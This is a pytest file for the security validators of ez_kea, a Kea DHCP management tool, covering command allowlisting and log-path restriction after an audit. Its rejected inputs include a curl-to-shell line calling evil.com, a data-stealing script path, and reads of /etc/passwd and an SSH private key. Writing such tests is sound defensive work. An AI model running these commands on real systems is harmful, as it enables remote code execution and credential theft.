"""
tests/test_security.py

Unit tests for ez_kea/core/security.py — the guardrails closing
AUDIT_FINDINGS.md 1.1 (RCE via kea_dhcp4_cmd/kea_ctrl_cmd) and
1.2 (arbitrary file read via dhcp_log_file).
"""
import os
import pytest

from ez_kea.core.security import (
    validate_kea_command,
    validate_log_file_path,
    InvalidKeaCommandError,
    InvalidLogPathError,
)


@pytest.fixture(autouse=True)
def mock_binary_resolution(monkeypatch):
    """Simulate kea-dhcp4/keactrl/docker being installed and executable on PATH."""
    monkeypatch.setattr("ez_kea.core.security.shutil.which", lambda name: f"/usr/sbin/{name}")
    monkeypatch.setattr("ez_kea.core.security.os.access", lambda path, mode: True)
    monkeypatch.setattr("ez_kea.core.security.os.path.isfile", lambda path: True)


class TestValidateKeaCommand:

    def test_allows_plain_kea_dhcp4(self):
        assert validate_kea_command("kea-dhcp4") == ["kea-dhcp4"]

    def test_allows_plain_keactrl(self):
        assert validate_kea_command("keactrl") == ["keactrl"]

    def test_allows_documented_docker_exec_pattern(self):
        parts = validate_kea_command("docker exec kea-testbed-kea-1 kea-dhcp4")
        assert parts == ["docker", "exec", "kea-testbed-kea-1", "kea-dhcp4"]

    def test_allows_docker_exec_keactrl(self):
        parts = validate_kea_command("docker exec kea-testbed-kea-1 keactrl")
        assert parts == ["docker", "exec", "kea-testbed-kea-1", "keactrl"]

    def test_rejects_arbitrary_script(self):
        with pytest.raises(InvalidKeaCommandError):
            validate_kea_command("/tmp/evil.sh")

    def test_rejects_arbitrary_script_with_args(self):
        with pytest.raises(InvalidKeaCommandError):
            validate_kea_command("/tmp/evil.sh --steal-data")

    def test_rejects_shell_metacharacter_smuggling(self):
        # shlex.split means this parses as a single literal argv[0], but make sure
        # it's still rejected on the basename check either way.
        with pytest.raises(InvalidKeaCommandError):
            validate_kea_command("bash -c 'curl evil.com | sh'")

    def test_rejects_docker_without_exec(self):
        with pytest.raises(InvalidKeaCommandError):
            validate_kea_command("docker run --rm alpine")

    def test_rejects_docker_exec_non_kea_target(self):
        with pytest.raises(InvalidKeaCommandError):
            validate_kea_command("docker exec kea-testbed-kea-1 /bin/sh")

    def test_rejects_empty_command(self):
        with pytest.raises(InvalidKeaCommandError):
            validate_kea_command("")

    def test_rejects_binary_not_found(self, monkeypatch):
        monkeypatch.setattr("ez_kea.core.security.shutil.which", lambda name: None)
        with pytest.raises(InvalidKeaCommandError):
            validate_kea_command("kea-dhcp4")

    def test_rejects_non_executable_binary(self, monkeypatch):
        monkeypatch.setattr("ez_kea.core.security.os.access", lambda path, mode: False)
        with pytest.raises(InvalidKeaCommandError):
            validate_kea_command("kea-dhcp4")

    def test_absolute_path_to_allowed_basename_is_checked_for_executability(self, monkeypatch):
        monkeypatch.setattr("ez_kea.core.security.os.path.isfile", lambda path: False)
        with pytest.raises(InvalidKeaCommandError):
            validate_kea_command("/usr/sbin/kea-dhcp4")


class TestValidateLogFilePath:

    def test_allows_path_matching_config_declared_logger(self, tmp_path):
        config_file = tmp_path / "kea-dhcp4.conf"
        config_file.write_text('{"Dhcp4": {"loggers": [{"name": "kea-dhcp4", "output_options": [{"output": "/some/declared/path.log"}]}]}}')
        # Even though /some/declared/path.log is outside any allowlisted dir,
        # it's what the config itself already declares, so it must be allowed.
        result = validate_log_file_path("/some/declared/path.log", str(config_file), str(tmp_path / "fallback.log"))
        assert result == "/some/declared/path.log"

    def test_allows_path_next_to_config_file(self, tmp_path):
        config_file = tmp_path / "kea-dhcp4.conf"
        config_file.write_text('{}')
        candidate = str(tmp_path / "kea-dhcp4.log")
        assert validate_log_file_path(candidate, str(config_file), str(tmp_path / "fallback.log")) == candidate

    def test_allows_var_log_kea(self, tmp_path):
        config_file = tmp_path / "kea-dhcp4.conf"
        config_file.write_text('{}')
        candidate = "/var/log/kea/kea-dhcp4.log"
        assert validate_log_file_path(candidate, str(config_file), str(tmp_path / "fallback.log")) == candidate

    def test_rejects_etc_passwd(self, tmp_path):
        """Live PoC from AUDIT_FINDINGS.md 1.2."""
        config_file = tmp_path / "kea-dhcp4.conf"
        config_file.write_text('{}')
        with pytest.raises(InvalidLogPathError):
            validate_log_file_path("/etc/passwd", str(config_file), str(tmp_path / "fallback.log"))

    def test_rejects_arbitrary_path_outside_allowlist(self, tmp_path):
        config_file = tmp_path / "kea-dhcp4.conf"
        config_file.write_text('{}')
        with pytest.raises(InvalidLogPathError):
            validate_log_file_path("/home/victim/.ssh/id_rsa", str(config_file), str(tmp_path / "fallback.log"))
